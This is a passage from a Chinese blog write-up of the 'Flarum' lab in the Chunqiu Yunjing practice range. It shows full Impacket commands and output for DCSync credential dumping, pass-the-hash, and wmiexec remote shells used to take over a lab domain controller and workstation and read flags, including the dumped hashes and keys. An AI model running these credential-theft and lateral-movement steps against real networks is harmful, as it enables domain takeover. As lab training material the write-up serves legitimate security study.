  <span class="token operator">|</span> <span class="token operator">|</span>_ <span class="token punctuation">\</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  ,--.   _ .--.  __   _   _ .--<span class="token punctuation">..</span>--.   
  <span class="token operator">|</span>  _<span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable">`</span></span><span class="token string">'_\ : [ `/'</span><span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span><span class="token punctuation">]</span><span class="token punctuation">[</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">[</span> <span class="token variable">`</span></span>.-. .-. <span class="token operator">|</span>  
 _<span class="token operator">|</span> <span class="token operator">|</span>_     <span class="token operator">|</span> <span class="token operator">|</span> // <span class="token operator">|</span> <span class="token operator">|</span>, <span class="token operator">|</span> <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token punctuation">\</span>_/ <span class="token operator">|</span>, <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  
<span class="token operator">|</span>_____<span class="token operator">|</span>   <span class="token punctuation">[</span>___<span class="token punctuation">]</span><span class="token punctuation">\</span>'-<span class="token punctuation">;</span>__/<span class="token punctuation">[</span>___<span class="token punctuation">]</span>    <span class="token string">'.__.'</span>_/<span class="token punctuation">[</span>___<span class="token operator">||</span>__<span class="token operator">||</span>__<span class="token punctuation">]</span> 

flag03: flag<span class="token punctuation">&#123;</span>5b291b29-9447-49b7-9480-174af6380aa7<span class="token punctuation">&#125;</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>wmic nicconfig get IPAddress
IPAddress                                      
                                              
<span class="token punctuation">&#123;</span><span class="token string">"169.254.10.74"</span>, <span class="token string">"fe80::ab7:40c0:dac3:17f4"</span><span class="token punctuation">&#125;</span>  
                                            
<span class="token punctuation">&#123;</span><span class="token string">"172.22.60.42"</span>, <span class="token string">"fe80::23c:7e40:45d:5ed8"</span><span class="token punctuation">&#125;</span>    
</code></pre>

<p>是172.22.60.42这台机器，也就是FILESERVER<br><img src="https://i.111666.best/image/TmGLNGkcKhlUKHvN8Zua0y.png" alt="image" loading="lazy"><br>FILESERVER对域控有DCsync权限也就可以dump下来域控的哈希</p>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>可以直接使用mimikatz或者先抓FILESERVER的哈希然后PTH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator.ccache 
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains impacket-secretsdump <span class="token parameter variable">-k</span> -no-pass  FILESERVER.xiaorang.lab -dc-ip <span class="token number">172.22</span>.60.8                                           <span class="token punctuation">[</span><span class="token number">15</span>:15:10<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.12.0.dev1 - Copyright <span class="token number">2023</span> Fortra

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.42:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Service RemoteRegistry is <span class="token keyword">in</span> stopped state
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> RemoteRegistry
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target system bootKey: 0xef418f88c0327e5815e32083619efdf5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping <span class="token builtin class-name">local</span> SAM hashes <span class="token punctuation">(</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd8e2e150f44ea79fff5034cad4539fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b40dda6fd91a2212d118d83e94b61b11:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping cached domain logon information <span class="token punctuation">(</span>domain/username:hash<span class="token punctuation">)</span>
XIAORANG.LAB/Administrator:<span class="token variable">$DCC2</span><span class="token variable">$10240</span><span class="token comment">#Administrator#f9224930044d24598d509aeb1a015766: (2023-08-02 07:52:21)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping LSA Secrets
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token variable">$MACHINE</span>.ACC 
XIAORANG<span class="token punctuation">\</span>Fileserver$:plain_password_hex:3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300
XIAORANG<span class="token punctuation">\</span>Fileserver$:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DPAPI_SYSTEM 
dpapi_machinekey:0x15367c548c55ac098c599b20b71d1c86a2c1f610
dpapi_userkey:0x28a7796c724094930fc4a3c5a099d0b89dccd6d1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NL<span class="token variable">$KM</span> 
 0000   8B <span class="token number">14</span> <span class="token number">51</span> <span class="token number">59</span> D7 <span class="token number">67</span> <span class="token number">45</span> <span class="token number">80</span>  9F 4A <span class="token number">54</span> 4C 0D E1 D3 <span class="token number">29</span>   <span class="token punctuation">..</span>QY.gE<span class="token punctuation">..</span>JTL<span class="token punctuation">..</span>.<span class="token punctuation">)</span>
 0010   3E B6 CC <span class="token number">22</span> FF B7 C5 <span class="token number">74</span>  7F E4 B0 AD E7 FA <span class="token number">90</span> 0D   <span class="token operator">></span><span class="token punctuation">..</span>"<span class="token punctuation">..</span>.t<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
 0020   1B <span class="token number">77</span> <span class="token number">20</span> D5 A6 <span class="token number">67</span> <span class="token number">31</span> E9  9E <span class="token number">38</span> DD <span class="token number">95</span> B0 <span class="token number">60</span> <span class="token number">32</span> C4   .w <span class="token punctuation">..</span>g1<span class="token punctuation">..</span><span class="token number">8</span><span class="token punctuation">..</span>.`2.
 0030   BE 8E <span class="token number">72</span> 4D 0D <span class="token number">90</span> 01 7F  01 <span class="token number">30</span> AC D7 F8 4C 2B 4A   <span class="token punctuation">..</span>rM<span class="token punctuation">..</span><span class="token punctuation">..</span>.0<span class="token punctuation">..</span>.L+J
NL<span class="token variable">$KM</span>:8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>. 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stopping <span class="token function">service</span> RemoteRegistry</code></pre>
<p>拿到FILESERVER的哈希<code>951d8a9265dfb652f42e5c8c497d70dc</code>,然后通过PTH dump域控的哈希(DCSync)</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains  secretsdump.py xiaorang.lab/<span class="token string">'Fileserver$'</span>:@172.22.60.8 <span class="token parameter variable">-hashes</span> <span class="token string">':951d8a9265dfb652f42e5c8c497d70dc'</span> -just-dc-user Administrator 
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:135  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:49668  <span class="token punctuation">..</span>.  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683
Administrator:aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9
Administrator:des-cbc-md5:f72a9889a18cc408
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>. 
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:445  <span class="token punctuation">..</span>.  OK</code></pre>
<p>拿到域控哈希<code>c3cfdc08527ec4ab6aa3e630e79d349b</code>,到这也就做完了，但是还有PC1的flag没拿，可以通过域控连过去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains  wmiexec.py <span class="token parameter variable">-hashes</span> :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8                              <span class="token punctuation">[</span><span class="token number">15</span>:26:29<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> SMBv3.0 dialect used
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:135  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.8:56200  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Launching semi-interactive shell - Careful what you execute
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
C:<span class="token punctuation">\</span><span class="token operator">></span>whoami
xiaorang<span class="token punctuation">\</span>administrator
C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token operator">></span>type flag04.txt
 :::<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> :::      :::<span class="token operator">==</span><span class="token operator">==</span>  :::<span class="token operator">==</span><span class="token operator">==</span>  :::  <span class="token operator">==</span><span class="token operator">=</span> :::<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 
 :::      :::      :::  <span class="token operator">==</span><span class="token operator">=</span> :::  <span class="token operator">==</span><span class="token operator">=</span> :::  <span class="token operator">==</span><span class="token operator">=</span> ::: <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span>
 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>   <span class="token operator">==</span><span class="token operator">=</span>      <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span>
 <span class="token operator">==</span><span class="token operator">=</span>      <span class="token operator">==</span><span class="token operator">=</span>      <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span>     <span class="token operator">==</span><span class="token operator">=</span>
 <span class="token operator">==</span><span class="token operator">=</span>      <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">=</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>  <span class="token operator">==</span><span class="token operator">=</span>     <span class="token operator">==</span><span class="token operator">=</span>

flag04: flag<span class="token punctuation">&#123;</span>1d8098d2-86d3-46a4-99a5-e0ca7bbd9a38<span class="token punctuation">&#125;</span></code></pre>
<p>然后去PC1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains  wmiexec.py <span class="token parameter variable">-hashes</span> :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 <span class="token parameter variable">-codec</span> gbk               <span class="token punctuation">[</span><span class="token number">15</span>:30:11<span class="token punctuation">]</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.15:445  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> SMBv3.0 dialect used
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.15:135  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.60.15:53153  <span class="token punctuation">..</span>.  OK
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Launching semi-interactive shell - Careful what you execute
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
C:<span class="token punctuation">\</span><span class="token operator">></span>cd <span class="token function">users</span>
C:<span class="token punctuation">\</span>users<span class="token operator">></span>cd administrator
C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token operator">></span>cd flag
C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token operator">></span>type flag02.txt
d88888b db       .d8b.  d8888b. db    db .88b  d88. 
<span class="token number">88</span><span class="token string">'     88      d8'</span> <span class="token variable"><span class="token variable">`</span>8b <span class="token number">88</span>  <span class="token variable">`</span></span>8D <span class="token number">88</span>    <span class="token number">88</span> <span class="token number">88</span><span class="token string">'YbdP`88 
88ooo   88      88ooo88 88oobY'</span> <span class="token number">88</span>    <span class="token number">88</span> <span class="token number">88</span>  <span class="token number">88</span>  <span class="token number">88</span> 
<span class="token number">88</span>~~~   <span class="token number">88</span>      <span class="token number">88</span>~~~88 <span class="token number">88</span><span class="token variable"><span class="token variable">`</span>8b   <span class="token number">88</span>    <span class="token number">88</span> <span class="token number">88</span>  <span class="token number">88</span>  <span class="token number">88</span> 
<span class="token number">88</span>      88booo. <span class="token number">88</span>   <span class="token number">88</span> <span class="token number">88</span> <span class="token variable">`</span></span><span class="token number">88</span>. 88b  d88 <span class="token number">88</span>  <span class="token number">88</span>  <span class="token number">88</span> 
YP      Y88888P YP   YP <span class="token number">88</span>   YD ~Y8888P' YP  YP  YP 

flag02: flag<span class="token punctuation">&#123;</span>22f2778a-7125-4171-bade-9f5e8553668d<span class="token punctuation">&#125;</span></code></pre>
















</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/f85c7fea/" title="春秋云境-Flarum">https://tao0845.github.io/posts/f85c7fea/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/b6e8119b/" rel="prev" title="春秋云境-Brute4Road"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">春秋云境-Brute4Road</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/beaf5221/" rel="next" title="春秋云境-TunnelX"><span class="post-nav-text">春秋云境-TunnelX</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>